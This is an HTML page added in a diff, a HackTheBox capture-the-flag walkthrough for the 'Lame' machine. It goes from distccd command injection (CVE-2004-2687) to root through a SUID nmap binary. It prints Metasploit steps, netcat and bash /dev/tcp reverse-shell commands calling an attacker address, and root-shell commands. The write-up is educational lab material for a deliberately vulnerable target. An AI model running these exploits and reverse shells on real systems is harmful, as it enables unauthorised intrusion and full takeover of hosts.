@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Lame — HackTheBox walkthrough</title>
+<meta name="description" content="Walkthrough for the Lame machine on HackTheBox: distccd RCE (CVE-2004-2687) for a daemon foothold, then nmap SUID for root." />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,500;0,9..144,600;1,9..144,500&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="styles/lame.css" />
+</head>
+<body>
+<div class="wrap">
+
+  <a href="../walkthroughs.html" class="back">back to walkthroughs</a>
+
+  <header class="wt-header">
+    <div class="wt-platform"><span class="dot">●</span> HackTheBox</div>
+    <h1><em>Lame</em></h1>
+    <div class="wt-meta">
+      <span class="badge easy">Easy</span>
+      <span class="badge tag">linux</span>
+      <span class="badge tag">distccd</span>
+      <span class="badge tag">cve-2004-2687</span>
+      <span class="badge tag">suid</span>
+      <span class="badge tag">nmap</span>
+    </div>
+    <p class="wt-summary">
+      One of the oldest boxes on HackTheBox and still one of the best learning experiences.
+      A misconfigured <code>distccd</code> daemon (CVE-2004-2687) accepts arbitrary command
+      injection on port 3632, handing us a shell as <code>daemon</code>. From there, a
+      world-visible SUID bit on <code>nmap</code> — combined with its built-in
+      <code>--interactive</code> mode — drops us straight to <strong>root</strong>.
+    </p>
+  </header>
+
+  <nav class="toc">
+    <div class="toc-title">Contents</div>
+    <ol>
+      <li><a href="#recon">Reconnaissance</a></li>
+      <li><a href="#enum">Service enumeration</a></li>
+      <li><a href="#vuln">Identifying the vulnerability</a></li>
+      <li><a href="#exploit">Exploitation — foothold as daemon</a></li>
+      <li><a href="#shell">Stabilizing the shell</a></li>
+      <li><a href="#privesc">Privilege escalation — nmap SUID</a></li>
+      <li><a href="#loot">Collecting the flags</a></li>
+      <li><a href="#takeaways">Takeaways</a></li>
+    </ol>
+  </nav>
+
+  <h2 id="recon"><span class="num">01</span> Reconnaissance</h2>
+
+  <p>Kick off a full-range TCP scan with service detection and default scripts.</p>
+
+  <pre><code>nmap -sC -sV -p- -T4 10.10.10.3 -oN nmap.txt</code></pre>
+
+  <pre class="output"><code>PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4)</code></pre>
+
+  <p>There are several known-vulnerable services here. The one we'll use:</p>
+
+  <ul>
+    <li><strong>distccd on 3632</strong> — distccd v1 is vulnerable to CVE-2004-2687, which
+    allows unauthenticated remote command execution. This is our foothold.</li>
+    <li><strong>vsftpd 2.3.4</strong> — famous smiley-face backdoor, but this specific HTB
+    image doesn't carry the payload. The exploit will hang; skip it.</li>
+    <li><strong>Samba 3.0.20</strong> — also exploitable via CVE-2007-2447, but we're going
+    through distccd today.</li>
+  </ul>
+
+  <h2 id="enum"><span class="num">02</span> Service enumeration</h2>
+
+  <p>Before exploiting, confirm the distccd service is actually accessible and responding.
+  The Nmap NSE library ships a dedicated script for this:</p>
+
+  <pre><code>nmap -p 3632 --script distcc-exec --script-args="distcc-exec.cmd='id'" 10.10.10.3</code></pre>
+
+  <pre class="output"><code>PORT     STATE SERVICE
+3632/tcp open  distccd
+
+Host script results:
+| distcc-exec:
+|   VULNERABLE (CVE-2004-2687)
+|   Distributed Compiler Daemon Command Execution
+|     State: VULNERABLE (Exploitable)
+|     IDs: CVE:CVE-2004-2687
+|     Description:
+|       Allows executing of arbitrary commands on systems running distccd 3.1
+|       and earlier. The vulnerability is present when passwordless access is
+|       enabled, which is the default configuration.
+|
+|     Output:
+|       uid=1(daemon) gid=1(daemon) groups=65534(nogroup)</code></pre>
+
+  <p>The NSE script both confirms the vuln and proves execution — we can already see the
+  output of <code>id</code> running as <code>daemon</code>. Now we move to a real shell.</p>
+
+  <h2 id="vuln"><span class="num">03</span> Identifying the vulnerability</h2>
+
+  <p>CVE-2004-2687 affects distccd versions up to 3.1. The distccd daemon is designed to
+  accept compilation jobs from remote hosts and execute them locally. With no authentication
+  layer in the default configuration, an attacker can submit a fake "job" whose payload is
+  an arbitrary shell command rather than source code. The daemon runs the command as whatever
+  user launched it — in this case, <code>daemon</code>.</p>
+
+  <div class="callout">
+    <strong>Why not Samba?</strong> CVE-2007-2447 against Samba 3.0.20 gives an instant root
+    shell, which is actually <em>worse</em> for learning. The distccd path forces you to do
+    a real privilege escalation step instead of getting root handed to you.
+  </div>
+
+  <h2 id="exploit"><span class="num">04</span> Exploitation — foothold as daemon</h2>
+
+  <h3>Path A — Metasploit</h3>
+
+  <p>Metasploit ships a module for exactly this CVE:</p>
+
+  <pre><code>msfconsole -q
+use exploit/unix/misc/distcc_exec
+set RHOSTS 10.10.10.3
+set LHOST tun0
+set PAYLOAD cmd/unix/reverse
+run</code></pre>
+
+  <pre class="output"><code>[*] Started reverse TCP double handler on 10.10.X.X:4444
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo rXg...
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (10.10.X.X:4444 -> 10.10.10.3:52840)
+
+daemon@lame:/tmp$</code></pre>
+
+  <h3>Path B — manual (no Metasploit)</h3>
+
+  <p>The distccd protocol is simple enough to abuse with a Python one-liner. The classic
+  approach wraps the command in a <code>DIST</code> protocol handshake using netcat or a
+  small script. The cleanest manual path repurposes the same NSE script from enumeration,
+  but this time points it at a reverse shell payload:</p>
+
+  <p>Start a listener on the attack box:</p>
+
+  <pre><code>nc -lvnp 4444</code></pre>
+
+  <p>Then fire the NSE script with a bash reverse shell as the command:</p>
+
+  <pre class="shell"><code>nmap -p 3632 10.10.10.3 --script distcc-exec \
+  --script-args 'distcc-exec.cmd="nc 10.10.X.X 4444 -e /bin/bash"'</code></pre>
+
+  <p>The listener receives a connection as <code>daemon</code>.</p>
+
+  <div class="callout warn">
+    <strong>Gotcha:</strong> <code>nc -e</code> requires the BSD/traditional variant of
+    netcat. On Lame this works because the image is Ubuntu 8.04. On newer targets, fall back
+    to a bash TCP redirect: <code>bash -i &gt;&amp; /dev/tcp/10.10.X.X/4444 0&gt;&amp;1</code>.
+  </div>
+
+  <h2 id="shell"><span class="num">05</span> Stabilizing the shell</h2>
+
+  <p>The reverse shell is raw — no job control, no tab completion, Ctrl+C kills the session.
+  Upgrade it before doing anything else:</p>
+
+  <pre><code>python -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# Ctrl+Z to background the shell
+stty raw -echo; fg
+# press Enter twice</code></pre>
+
+  <p>Confirm context:</p>
+
+  <pre><code>id</code></pre>
+
+  <pre class="output"><code>uid=1(daemon) gid=1(daemon) groups=65534(nogroup)</code></pre>
+
+  <p>We're <code>daemon</code>, not root. Time to escalate.</p>
+
+  <h2 id="privesc"><span class="num">06</span> Privilege escalation — nmap SUID</h2>
+
+  <p>Standard first check after getting a foothold: look for SUID binaries.</p>
+
+  <pre><code>find / -perm -u=s -type f 2>/dev/null</code></pre>
+
+  <pre class="output"><code>/usr/bin/nmap
+/usr/bin/perl
+/usr/bin/passwd
+/usr/bin/sudoedit
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/traceroute6.iputils
+/usr/sbin/uuidd
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/bin/ping6
+/bin/umount
+/bin/fusermount
+/bin/su
+/bin/mount
+/bin/ping</code></pre>
+
+  <p><code>/usr/bin/nmap</code> with SUID is the one that matters. Nmap versions 2.02 through
+  5.21 ship with an <code>--interactive</code> mode that drops into a sub-shell. Because
+  this binary runs as root (SUID), that shell is a root shell.</p>
+
+  <p>Check the version to confirm:</p>
+
+  <pre><code>nmap --version</code></pre>
+
+  <pre class="output"><code>Nmap version 4.53 ( http://insecure.org )</code></pre>
+
+  <p>4.53 — well within the vulnerable range. Enter interactive mode:</p>
+
+  <pre><code>nmap --interactive</code></pre>
+
+  <pre class="output"><code>Starting Nmap V. 4.53 ( http://insecure.org )
+Welcome to Interactive Mode -- press h &lt;enter&gt; for help
+nmap&gt;</code></pre>
+
+  <p>From the nmap prompt, spawn a shell:</p>
+
+  <pre><code>nmap> !sh</code></pre>
+
+  <pre class="output"><code>sh-3.2# id
+uid=0(root) gid=0(root)</code></pre>
+
+  <div class="callout">
+    <strong>Why does this work?</strong> <code>!</code> in nmap's interactive mode passes the
+    rest of the line to <code>/bin/sh</code>. Because the nmap binary has the SUID root bit
+    set and is never dropped before spawning the shell, the resulting process inherits the
+    effective UID of root.
+  </div>
+
+  <h2 id="loot"><span class="num">07</span> Collecting the flags</h2>
+
+  <p>Root shell in hand. Both flags are a short <code>cat</code> away:</p>
+
+  <pre><code>cat /home/makis/user.txt
+cat /root/root.txt</code></pre>
+
+  <div class="callout">
+    <strong>Note:</strong> the low-priv user on Lame is historically named <code>makis</code>.
+    Run <code>ls /home/</code> if the path doesn't exist — the name varies across box
+    resets and reimages.
+  </div>
+
+  <h2 id="takeaways"><span class="num">08</span> Takeaways</h2>
+
+  <ul>
+    <li><strong>Read every port, not just the obvious ones.</strong> Port 3632 is easy to
+    overlook next to Samba and FTP — but it's the one that matters here. Skimming the Nmap
+    output would have sent you down the wrong path.</li>
+    <li><strong><code>find / -perm -u=s</code> is always step one for privesc.</strong>
+    SUID binaries are low-hanging fruit and should be checked before anything else. GTFOBins
+    has a full list of binaries that can be abused when SUID-flagged.</li>
+    <li><strong>Understand the --interactive trick, don't just memorise it.</strong> The
+    reason it works is SUID preserving the effective UID into child processes. Any binary
+    that spawns a shell while SUID-rooted is the same class of vulnerability.</li>
+    <li><strong>The unintended path (Samba) skips the privesc entirely.</strong> Choosing the
+    harder foothold — distccd — forced a real privilege escalation exercise. That's the
+    version worth practising for OSCP and real engagements.</li>
+  </ul>
+
+  <footer>
+    <div>LOOKY · writeup</div>
+    <div>HackTheBox · Lame</div>
+  </footer>
+
+</div>
+</body>
+</html>
